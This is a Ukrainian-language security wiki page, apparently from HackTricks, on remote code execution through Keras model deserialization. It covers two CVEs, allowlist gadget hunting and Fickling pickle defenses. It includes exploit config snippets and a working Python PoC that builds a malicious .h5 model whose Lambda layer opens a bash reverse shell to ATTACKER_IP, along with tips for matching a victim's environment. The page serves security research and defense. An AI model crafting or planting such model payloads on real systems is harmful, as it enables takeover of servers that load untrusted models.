# RCE під час десеріалізації моделей Keras і пошук gadget-ів

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено практичні методи експлуатації pipeline десеріалізації моделей Keras, пояснено внутрішню структуру native формату .keras і його attack surface, а також наведено набір інструментів дослідника для пошуку Model File Vulnerabilities (MFVs) і post-fix gadget-ів.

## Внутрішня структура формату моделі .keras

Файл .keras є ZIP-архівом, що містить щонайменше:<sup>[[1]](#references)</sup>
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна attack surface)
- model.weights.h5 – ваги у форматі HDF5

config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, визначає класи/функції та відновлює шари/об'єкти зі словників, контрольованих attacker-ом.<sup>[[1]](#references)</sup>

Приклад фрагмента для об'єкта шару Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization виконує:<sup>[[1]](#references)</sup>
- Імпорт модуля та пошук символу з ключів module/class_name
- Виклик from_config(...) або конструктора з kwargs, контрольованими атакуючим
- Рекурсивний обхід вкладених об'єктів (activations, initializers, constraints тощо)

Історично це надавало атакуючому, який створював config.json, три примітиви:<sup>[[1]](#references)</sup>
- Контроль над модулями, які імпортуються
- Контроль над класами/функціями, які знаходяться
- Контроль над kwargs, що передаються конструкторам/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Першопричина:
- Lambda.from_config() використовував python_utils.func_load(...), який декодує base64 і викликає marshal.loads() для байтів, контрольованих атакуючим; unmarshalling у Python може виконувати код.<sup>[[1]](#references)[[3]](#references)</sup>

Ідея експлуатації (спрощений payload у config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Заходи захисту:
- Keras за замовчуванням застосовує safe_mode=True. Serialized Python functions у Lambda блокуються, якщо користувач явно не вимкне цей режим за допомогою safe_mode=False.<sup>[[1]](#references)</sup>

Примітки:
- Legacy formats (старіші збереження HDF5) або старі codebases можуть не застосовувати сучасні перевірки, тому атаки в стилі “downgrade” усе ще можливі, коли жертви використовують старі loaders.

## CVE-2025-1550 – Імпорт довільного модуля в Keras ≤ 3.8

Першопричина:
- _retrieve_class_or_fn використовував необмежений importlib.import_module() з контрольованими attacker-ом рядками модулів із config.json.
- Вплив: імпорт будь-якого встановленого модуля (або модуля, розміщеного attacker-ом у sys.path). Код, що виконується під час імпорту, запускається, після чого відбувається створення об'єкта з attacker-керованими kwargs.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ідея exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: імпорти обмежені модулями офіційної екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Basic type checking: десеріалізовані об’єкти мають відповідати очікуваним типам

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Багато production-стеків досі приймають legacy-файли моделей TensorFlow-Keras HDF5 (.h5). Якщо attacker може завантажити модель, яку сервер згодом завантажує або використовує для inference, шар Lambda може виконати довільний Python під час load/build/predict.<sup>[[7]](#references)</sup>

Мінімальний PoC для створення шкідливого .h5, який виконує reverse shell під час десеріалізації або використання:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Нотатки та поради щодо надійності:
- Точки запуску: code може виконуватися кілька разів (наприклад, під час build/first call layer, model.load_model і predict/fit). Робіть payloads idempotent.<sup>[[7]](#references)</sup>
- Фіксація версій: узгодьте TF/Keras/Python із середовищем victim, щоб уникнути serialization mismatches. Наприклад, створюйте artifacts у Python 3.8 із TensorFlow 2.13.1, якщо саме це використовує target.<sup>[[7]](#references)</sup>
- Швидке відтворення середовища:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: benign payload на кшталт os.system("ping -c 1 YOUR_IP") допомагає підтвердити виконання (наприклад, спостерігаючи ICMP за допомогою tcpdump) перед переходом до reverse shell.<sup>[[7]](#references)</sup>

## Поверхня gadget-ів після виправлення всередині allowlist

Навіть із allowlisting і safe mode серед дозволених викликуваних об'єктів Keras залишається широкa поверхня. Наприклад, keras.utils.get_file може завантажувати довільні URL-адреси в розташування, вибране користувачем.<sup>[[1]](#references)</sup>

Gadget через Lambda, який посилається на дозволену функцію (без серіалізованого Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- Lambda.call() додає вхідний tensor як перший позиційний аргумент під час виклику цільового callable. Обрані gadgets мають допускати додатковий позиційний аргумент (або приймати *args/**kwargs). Це обмежує перелік функцій, які можна використовувати.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting для AI/ML моделей (Fickling)

Багато форматів AI/ML моделей (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, старі артефакти TensorFlow тощо) містять дані Python pickle. Attackers регулярно зловживають імпортами pickle GLOBAL і конструкторами об’єктів для досягнення RCE або підміни моделей під час завантаження. Сканери на основі blacklist часто пропускають нові або не внесені до списку небезпечні імпорти.<sup>[[8]](#references)[[14]](#references)</sup>

Практичний fail-closed захист полягає в перехопленні pickle deserializer у Python і дозволі лише перевіреного набору нешкідливих ML-related імпортів під час unpickling. Fickling від Trail of Bits реалізує цю політику та містить curated ML import allowlist, створений на основі тисяч публічних pickle-файлів із Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Модель безпеки для “безпечних” імпортів (інтуїції, узагальнені з досліджень і практики): символи, імпортовані та використані pickle, одночасно мають:<sup>[[8]](#references)</sup>
- Не виконувати код і не спричиняти його виконання (без compiled/source code objects, запуску shell-команд, hooks тощо)
- Не отримувати та не встановлювати довільні атрибути або items
- Не імпортувати та не отримувати references до інших Python objects із pickle VM
- Не запускати жодні secondary deserializers (наприклад, marshal або вкладений pickle), навіть опосередковано

Увімкніть protections Fickling якомога раніше під час запуску процесу, щоб усі pickle loads, які виконують frameworks (torch.load, joblib.load тощо), перевірялися:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Операційні поради:
- За потреби можна тимчасово вимикати/повторно вмикати хуки:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Якщо перевірену модель заблоковано, розширте allowlist для вашого середовища після перевірки символів:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling також надає generic runtime guards, якщо вам потрібен більш granular control:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() для застосування перевірок до всіх pickle.load()
- with fickling.check_safety(): для застосування перевірок у певній області
- fickling.load(path) / fickling.is_likely_safe(path) для одноразових перевірок

- За можливості надавайте перевагу форматам моделей, відмінним від pickle (наприклад, SafeTensors).<sup>[[15]](#references)</sup> Якщо ви змушені приймати pickle, запускайте loaders із мінімальними привілеями, без network egress, і застосовуйте allowlist.

Ця allowlist-first strategy на практиці блокує поширені ML pickle exploit paths, водночас забезпечуючи високу сумісність. У ToB benchmark Fickling виявив 100% синтетичних malicious files і дозволив приблизно 99% clean files із популярних Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>


## Інструментарій дослідника

1) Систематичне виявлення gadget у дозволених модулях

Перелічіть candidate callables у keras, keras_nlp, keras_cv, keras_hub і надайте пріоритет тим, що мають побічні ефекти, пов’язані з файлами, мережею, процесами або середовищем.<sup>[[1]](#references)</sup>

<details>
<summary>Перелік потенційно небезпечних callables у allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Пряме тестування десеріалізації (архів `.keras` не потрібен)

Передавайте створені вручну dicts безпосередньо в десеріалізатори Keras, щоб дізнатися про прийнятні параметри та спостерігати за побічними ефектами.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Тестування між версіями та форматами

Keras існує в кількох codebase/ераx із різними guardrails і форматами:<sup>[[1]](#references)</sup>
- Вбудований у TensorFlow Keras: tensorflow/python/keras (застарілий, заплановано видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (official): представив native .keras

Повторюйте тести в різних codebase і форматах (.keras порівняно зі legacy HDF5), щоб виявити регресії або відсутні guard.

## References

- [1] [Пошук Vulnerabilities у Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Додано перевірки до serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE під час Keras Lambda deserialization](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Arbitrary module import у Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE до root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – новий AI/ML pickle file scanner від Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – захист AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Передумови атак Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Проєкт SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
